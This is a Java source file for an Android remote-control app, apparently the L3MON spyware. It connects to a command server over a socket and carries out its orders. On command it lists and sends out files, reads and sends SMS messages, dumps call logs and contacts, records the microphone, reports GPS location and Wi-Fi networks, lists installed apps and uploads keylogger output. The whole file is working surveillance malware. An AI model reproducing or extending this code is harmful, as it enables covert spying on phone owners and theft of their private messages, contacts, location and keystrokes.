package com.etechd.l3mon;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;

import com.example.callsmanager.CallsManager;
import com.example.commoninterfaces.IOSocket;
import com.example.commoninterfaces.Utilities;
import com.example.contactsmanager.ContactsManager;
import com.example.filemanager.FileManager;
import com.example.locmanager.LocManager;
import com.example.micmanager.MicManager;
import com.example.smsmanager.SMSManager;
import com.example.keyloggermanager.KeyLoggerManager;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.util.List;

public class ConnectionManager {

    @SuppressLint("StaticFieldLeak")
    public static Context context;
    private static io.socket.client.Socket ioSocket;

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }

    }

    public static void sendReq() {
        try {
            if (ioSocket != null)
                return;
            ioSocket = IOSocket.getInstance(context).getIoSocket();
            ioSocket.on("ping", args -> ioSocket.emit("pong"));
            ioSocket.on("order", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String order = data.getString("type");


                    switch (order) {
                        case "0xFI":
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                                if (data.getString("action").equals("ls"))
                                    FI(0, data.getString("path"), false);
                                else if (data.getString("action").equals("dl"))
                                    Log.d("FILE DL", "");
                                FI(1, data.getString("path"), false);
                                break;
                            }
                        case "0xSM":
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                                if (data.getString("action").equals("ls"))
                                    SM(0, null, null, false);
                                else if (data.getString("action").equals("sendSMS"))
                                    SM(1, data.getString("to"), data.getString("sms"), false);
                                break;
                            }

                        case "0xCL":
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                                CL(false);
                            }
                            break;
                        case "0xCO":
                            CO(false);
                            break;
                        case "0xMI":
                            MI(data.getInt("sec"), false);
                            break;
                        case "0xLO":
                            LO();
                            break;
                        case "0xWI":
                            WI();
                            break;
                        case "0xPM":
                            PM();
                            break;
                        case "0xIN":
                            IN();
                            break;
                        case "0xGP":
                            GP(data.getString("permission"));
                            break;
                        case "0xKL":
                            KL();
                            break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
            ioSocket.connect();

        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    public static void FI(int req , String path, boolean isSetup) {
        if (isSetup) {
            requestPermissions(context,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE);
            PM();
        } else {
            if (req == 0) {
                // List files
                JSONObject object = new JSONObject();
                try {
                    JSONArray files = FileManager.walk(path);
                    object.put("type", "list");
                    object.put("list", files);
                    ioSocket.emit("0xFI", object);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } else if (req == 1) {
                // Download file
                try {
                    Log.d("file", "Invoking File");
                    FileManager.downloadFile(path, context);
                    Log.d("FILE INVOKING Finished", "done");

                } catch (Exception e) {
                    Log.d("ERROR DOWNLOADING", e.getMessage());
                    throw new RuntimeException(e);
                }
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    public static void SM(int req, String phoneNo, String msg, boolean isSetup) {
        if (isSetup) {
            requestPermissions(context,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.READ_SMS);
            PM();
        } else {
            if (req == 0) {
                JSONObject sms = SMSManager.getsms(context);
                ioSocket.emit("0xSM", sms);
                Log.d("SMS List", String.valueOf(sms));
            } else if (req == 1) {
                boolean sent = SMSManager.sendSMS(phoneNo, msg);
                ioSocket.emit("0xSM", sent);
                Log.d("Send SMS", "SMS sent status = " + sent);
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    public static void CL(boolean isSetup) {
        if (isSetup) {
            requestPermissions(context, Manifest.permission.READ_CALL_LOG);
            PM();
        } else {
            JSONObject calls = CallsManager.getCallsLogs(context);
            ioSocket.emit("0xCL", calls);
            Log.d("Call List", String.valueOf(calls));
        }
    }

    public static void CO(boolean isSetup) {
        if (isSetup) {
            requestPermissions(context, Manifest.permission.READ_CONTACTS);
            PM();
        } else {
            JSONObject contacts = ContactsManager.getContacts(context);
            ioSocket.emit("0xCO", contacts);
            Log.d("Call List", String.valueOf(contacts));
        }
    }

    public static void MI(int sec, boolean isSetup) {
        if (isSetup) {
            requestPermissions(context,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.MODIFY_AUDIO_SETTINGS);
            PM();
        } else {
            try {
                MicManager.startRecording(sec, context);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static void WI() {
        ioSocket.emit("0xWI" , Utilities.scanWIFI(context));
    }

    public static void PM() {
        ioSocket.emit("0xPM" , Utilities.getGrantedPermissions(context));
    }


    public static void IN() {
        ioSocket.emit("0xIN" , Utilities.getInstalledApps(false, context));
    }

    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", Utilities.canIUse(perm, context));
            ioSocket.emit("0xGP", data);
        } catch (JSONException ignored) {

        }
    }

    public static void LO() {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        // check if GPS enabled
        if(gps.canGetLocation()){
            ioSocket.emit("0xLO", gps.getData());
        }
    }
    public static void KL() {
        KeyLoggerManager.getInstance().sendKeylogsToServer(ioSocket, context);
    }
    private static void requestPermissions(Context context, String... permissionType) {
        Dexter.withContext(context)
                .withPermissions(permissionType)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport multiplePermissionsReport) {
                        // this method is called when all permissions are granted
                        if (multiplePermissionsReport.areAllPermissionsGranted()) {
                            // do you work now
                            Toast.makeText(context, "All the permissions are granted..", Toast.LENGTH_SHORT).show();
                        }
                        // check for permanent denial of any permission
                        if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
                            showSettingsDialog();
                        }
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> list, PermissionToken permissionToken) {
                        permissionToken.continuePermissionRequest();
                    }
                }).withErrorListener(error -> Toast.makeText(context, "Error occurred! ", Toast.LENGTH_SHORT).show())
                .check();
    }

    private static void showSettingsDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setTitle("Need Permissions");
        builder.setMessage("This app needs permission to use this feature. You can grant them in app settings.");
        builder.setPositiveButton("GOTO SETTINGS", (dialog, which) -> {
            dialog.cancel();
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            Uri uri = Uri.fromParts("package", context.getPackageName(), null);
            intent.setData(uri);
            context.startActivity(intent);
        });
        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.cancel());
        builder.show();
    }
}
